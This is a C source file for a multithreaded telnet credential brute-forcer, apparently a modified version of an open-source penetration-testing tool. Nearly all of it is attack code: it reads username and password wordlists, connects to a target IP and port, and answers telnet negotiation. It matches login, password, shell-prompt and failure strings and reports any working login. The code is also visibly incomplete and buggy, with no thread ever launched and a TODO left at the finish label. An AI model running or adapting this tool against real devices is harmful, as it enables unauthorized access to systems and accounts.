/**
 * This is a program for bruteforcing telnet credentials. I am roughly basing it on
 * https://github.com/petrocchi/brute_telnet . Additionally, portions of the original code
 * may be found in loader.h.
 *
 * I have modified it in various ways, and attach below a copy of the original
 * license and author information.
 *
 * Modification authorship:
 * 
 * DATE:	05/02/2026
 * AUTHOR: 	Ismael Moniz
 * EMAIL:   hismamoniz@gmail.com
 * WEBSITE: https://ismasglade.com
 */
/*
 * brute_telnet.c - Telnet bruteforce, for penetration test.
 *
 * THIS TOOL IS FOR LEGAL PURPOSES ONLY!
 *
 * brute force crack the remote authentication service telnet, parallel
 * connection.
 *
 * Copyright (C) 2017 Luca Petrocchi <petrocchi@myoffset.me>
 *
 * DATE:	16/02/2017
 * AUTHOR:	Luca Petrocchi
 * EMAIL:	petrocchi@myoffset.me
 * WEBSITE	https://myoffset.me/
 * URL:		https://github.com/petrocchi
 *
 *
 *
 * brute_telnet is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * brute_telnet is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
 *
 * For compile: gcc -o brute_telnet brute_telnet.c -pthread
 *
 */
#include "loader.h"

#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <pthread.h>
#include <time.h>
#include <unistd.h>

void print_usage(char* pname) {
	printf("\nUsage: %s <target ip> <port> <userfile> <passfile> <n thread> [options]\n\n"
		   "<userfile>\tUsername wordlist\n"
		   "<passdile>\tPassword wordlist\n"
		   "<n threads>\tNumber of parallel threads\n"
		   "\nOptions:\n\t-v\tVerbose mode\n\nExamples:\n"
		   "\t./loader 192.168.1.1 23 user.txt wordlist.txt 30\n"
		   "\t./loader 192.168.1.1 23 user.txt wordlist.txt 30 -v\n\n", pname);
}

int main(int argc, char *argv[]) {
	char *username, *password;
	uint8_t verbose = 0, found = 0;
	char line_user[BIGLINE];
	char line_password[BIGLINE];
	FILE *fd_user, *fd_pass;

	struct addrinfo *tel_addr = (struct addrinfo*)malloc(sizeof(struct addrinfo));
	memset(tel_addr, 0, sizeof(struct addrinfo));
	
	if ((argc != 6) && (argc != 7)) {
		print_usage(argv[0]);
		return(1);
	}
	printf("[+] Target: %s:%s\n", argv[1], argv[2]);

	int n_threads = atoi(argv[5]);

	struct telnet_config tdata[n_threads];
	pthread_t thread_ids[n_threads];

	if( (argc == 7) && (!strcmp(argv[6], "-v")) ) {
		verbose = 1;
	} else {
		print_usage(argv[1]);
		return(1);
	}

	if (getaddrinfo(argv[1], argv[2], NULL, &tel_addr) < 0) {
		perror("getaddrinfo error\n");
		return 1;
	}

	if (tel_addr->ai_family == AF_INET6) {
		freeaddrinfo(tel_addr);
		perror("Only ipv4 is supported.\n");
		return 1;
	}
	// initialize thread data
	for (int i = 0; i < n_threads; ++i) {

		// tel_addr is read only afaik, so all threads can share the same heap allocated one
		tdata[i].tel_addr = tel_addr;
		tdata[i].found = &found;
		tdata[i].tforked = 0;
		tdata[i].verbose = verbose;
	}

	username = line_user;
	password = line_password;

	if ((fd_user = fopen(argv[3], "r")) == NULL) {
		perror("username file io error\n");
		return(1);
	}

	if ((fd_pass = fopen(argv[4], "r")) == NULL) {
		perror("password file io error\n");
		return(1);
	}

	if ( getentry(fd_user, username) == NULL) {
		perror("username getentry error\n");
	}

	int i = 0;
	while (!found) {
		if (i == n_threads) {
			i = 0;
		}

		if (tdata[i].tforked == 0) {
			tdata[i].tforked = 1; // set busy
			
			if (getrecord(fd_user, username, fd_pass, password) != 0) {
				goto finish;
			}
			
			// does each thread really need to own their own copy of username and password?
			if ( (tdata[i].username = (char*)malloc((strlen(username) + 1))) == NULL ) {
				perror("malloc error\n");
				freeaddrinfo(tel_addr);
				return 1;
			}
			strcpy(tdata[i].username, username);

			if ( (tdata[i].password = (char*)malloc((strlen(password) + 1))) == NULL ) {
				perror("malloc error\n");
				freeaddrinfo(tel_addr);
				return 1;
			}
			strcpy(tdata[i].password, password);
		}
		i++;
	}
finish: //TODO: complete this

	for(int wt=0; wt<n_threads; wt++) {
		if(tdata[wt].tforked == 1)
			if(pthread_join(thread_ids[wt], NULL)) {
				perror("pthread_join");
				exit(-1);
			}
	}
	fclose(fd_user);
	fclose(fd_pass);
	freeaddrinfo(tel_addr);
	return 0;
}

char* getentry(FILE* fd, char* line) {
	char* cut;

	bzero(line, BIGLINE);

	if (fgets(line, BIGLINE, fd)) {
		if ( (cut = strchr(line, '\n')) ) {
			*cut = '\0';
		}
		return line;
	}

	return NULL;
}

uint8_t getrecord(FILE* fd_user, char* username, FILE* fd_pass, char* password) {
	if (getentry(fd_pass, password) == NULL) {
		perror("password io error\n");
		return 1;
	}

	if (password[0] == '\0') {
		if (getentry(fd_user, username) == NULL) {
			perror("username io error\n");
			return 1;
		}
		if (username[0] == '\0') {
			perror("no more credentials to try\n");
			return 1;
		}
		fseek(fd_pass, 0, SEEK_SET);
		if (getentry(fd_pass, password) == NULL) {
			perror("password io error\n");
			return 1;
		}
	}
	return 0;
}

void* t_conn(void* t_args) {
	struct telnet_config* tdata = (struct telnet_config*)t_args;
	int sockfd;
	char ipstr[INET_ADDRSTRLEN];

	// safe as long as only ipv4 is supported explicitly
	struct sockaddr_in* ipv4 = (struct sockaddr_in *)tdata->tel_addr->ai_addr;
	struct sockaddr* sock = tdata->tel_addr->ai_addr;
	if (tdata->verbose == 1) {
		printf("telnet://%s@%s:%d %s\n",
				tdata->username,
				inet_ntop(tdata->tel_addr->ai_family, (void*)&ipv4->sin_addr, ipstr, sizeof(ipstr)),
				tdata->tel_addr->ai_protocol,
				tdata->password);
	}

	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket creation error\n");
		return NULL;
	}

	if ( (connect(sockfd, sock, sizeof(*socket))) < 0) {
		perror("socket connection error\n");
		return NULL;
	}

	if (!trycredentials(sockfd, tdata->username, tdata->password)) {
		printf("[LOGIN FOUND] %s:%s\n", tdata->username, tdata->password);
		*tdata->found = 1;
	}

	close(sockfd);
	tdata->tforked = 0;

	pthread_exit(NULL);
}

uint8_t trycredentials(int sockfd, char *username, char *password) {
	struct timeval tval;
	tval.tv_sec = 1;
	tval.tv_usec = 0;
	unsigned char buf[BUFLEN + 1];
	unsigned char buff_r[BUFF_R_SIZE];
	ssize_t rc;
	int level, flag = 0;
	fd_set fds;
	int selected_fds;

	bzero(buff_r, BUFF_R_SIZE);

	while (1) {
		FD_ZERO(&fds);
		FD_SET(sockfd, &fds);
		FD_SET(0, &fds);
		
		// wait for fds to be ready for reading
		if ( (selected_fds = select(sockfd + 1, &fds, (fd_set*) 0, (fd_set*) 0, &tval)) < 0) {
			perror("select error\n");
			return 4;
		}

		else if (sockfd != 0 && FD_ISSET(sockfd, &fds)) {
			if ((rc = recv(sockfd, buf, 1, 0)) < 0) {
				printf("Connection closed by local host!\n");
				return 2;
			}

			if (buf[0] == CMD) {
				if((rc = recv(sockfd, (buf + 1), 2, 0)) < 0) {
					printf("Connection closed by the remote host!\n");
					return 2;
				}
				negotiate(sockfd, buf, 3);
			} else {
				buf[1] = '\0';
				printf("%s", buf); // DEBUG
				
				if (strlen((const char*) buff_r) < (BUFF_R_SIZE - 2))
					strcat((char*)buff_r, (const char*) buf);
				else
					printf("[ERROR] Overload of buff_r for parsing! Resizing BUFF_R_SIZE might be necessary.");
				fflush(0);
			}
		} else if (!(FD_ISSET(sockfd, &fds))) {
			if ((level = parse((char*)buff_r, flag)) > 0){
				switch(level) {
					case 1: { 
						if ((rc = sendch(sockfd, username)) < 0) {
							printf("sendch error\n");
							return 4;
						}
						break;
						} // send login
					case 2: { 
						if ((rc = sendch(sockfd, password)) < 0 ) {
							printf("sendch error\n");
							return 4;
						}
						break;
						} // send password
					case 3: return 0; // got prompt :)
					default: break;
				}
				flag = level; //TODO: this is useless from what i can see so far
			} else {
				if (parse((char*)buff_r, 3) == 4) {
					return 1; // bad creds, no login :/
				}
			}
		}
	}
}

ssize_t sendch(int sockfd, char* buf_all) {
	char buf[1];
	int i;
	ssize_t rc;

	for (i = 0; i < strlen(buf_all); i++) {
		buf[0] = buf_all[i];
		if ((rc = send(sockfd, buf, 1, 0)) < 0) {
			return rc;
		}
	}

	buf[0] = '\r';
	rc = send(sockfd, buf, 1, 0);
	return rc;
}

int parse(char* buff, int type) {
	char *KNOWN_LOGIN[KNOWN_LOGIN_SIZE] = { "ogin:", "last login", "sername" };
	char *KNOWN_PSW[KNOWN_PSW_SIZE] = { "asswor", "asscode", "ennwort" };
	char *KNOWN_PRT[KNOWN_PRT_SIZE] = { "?", "/", ">", "%", "$", "#" };
	char *KNOWN_BAD[KNOWN_BAD_SIZE] = { "incorrect", "bad log", "no log" };

	int i;
	int p_size[4];
	char **p_known[4];

	p_size[0] = KNOWN_LOGIN_SIZE;
	p_size[1] = KNOWN_PSW_SIZE;
	p_size[2] = KNOWN_PRT_SIZE;
	p_size[3] = KNOWN_BAD_SIZE;

	p_known[0] = (char **)&KNOWN_LOGIN;
	p_known[1] = (char **)&KNOWN_PSW;
	p_known[2] = (char **)&KNOWN_PRT;
	p_known[3] = (char **)&KNOWN_BAD;

	for (i = 0; i < p_size[type]; i++) {
		if (strcasestr(buff, p_known[type][i]) != NULL)
			return (type+1);
	}

	return -1;
}

void negotiate(int sock, unsigned char* buf, int len) {
	unsigned char str_term[2][10] = {
		{ 255, 251, 31 },
		{255, 250, 31, 0, 80, 0, 24, 255, 240}
	};
	int i;
	ssize_t rc;

	if (buf[1] == DO && buf[2] == CMD_WINDOW_SIZE) {
		if ((rc = send(sock, str_term[0], 3, 0)) < 0) {
			perror("send error in negotiate");
			return;
		}
		if ((rc = send(sock, str_term[1], 9, 0)) < 0) {
			perror("send error in negotiate");
		}

		return;
	}

	for (i = 0; i < len; i++) {
		if (buf[i] == DO)
			buf[i] = WONT;
		else if(buf[i] == WILL)
			buf[i] = DO;
	}

	if ((rc = send(sock, buf, len, 0)) < 0) {
		perror("send error in negotiate");
	}
}
